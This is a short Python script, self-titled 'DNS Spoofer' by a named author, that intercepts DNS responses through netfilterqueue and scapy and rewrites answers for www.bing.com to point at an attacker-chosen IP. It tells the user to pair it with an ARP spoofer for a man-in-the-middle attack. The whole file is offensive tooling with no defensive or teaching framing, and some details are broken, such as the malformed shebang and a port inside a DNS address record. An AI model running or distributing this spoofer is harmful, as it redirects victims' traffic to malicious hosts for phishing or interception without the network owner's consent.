#! usr/env python

import scapy.all as scapy
import netfilterqueue
from colorama import init
from termcolor import colored
import os
import pyfiglet


ascii_banner = pyfiglet.figlet_format("DNS Spoofer\n By Zeckers")
print(ascii_banner)


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target ")
            answer = scapy.DNSRR(rrname=qname, rdata="93.31.82.227:8888")#Put the IP address you want to be redirect
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


print(colored("[+] Use the ARPSpoofer", "yellow"))
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()



